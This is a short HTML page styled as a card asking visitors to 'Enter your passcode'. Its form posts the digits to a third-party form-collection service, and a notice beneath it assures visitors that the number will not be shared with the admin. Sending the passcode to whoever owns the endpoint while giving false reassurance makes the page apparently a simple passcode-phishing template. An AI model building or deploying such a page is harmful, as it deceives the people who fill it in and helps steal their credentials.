<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Number Input</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #020617;
      color: #e5e7eb;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .card {
      background: #0f172a;
      padding: 25px;
      width: 320px;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0 0 20px rgba(0,0,0,0.6);
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 12px;
      font-size: 16px;
    }
    button {
      width: 100%;
      margin-top: 15px;
      padding: 10px;
      font-size: 16px;
      cursor: pointer;
    }
    small {
      display: block;
      margin-top: 10px;
      color: #94a3b8;
      font-size: 12px;
    }
  </style>
</head>
<body>

  <div class="card">
    <h3>Enter your passcode</h3>

    <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
      <input
        type="text"
        name="number_entered"
        placeholder="Numbers only"
        inputmode="numeric"
        pattern="[0-9]+"
        required
      >
      <button type="submit">Submit</button>
    </form>

    <small>
      âš  The number you enter will not be shared with the admin.
    </small>
  </div>

</body>
</html>
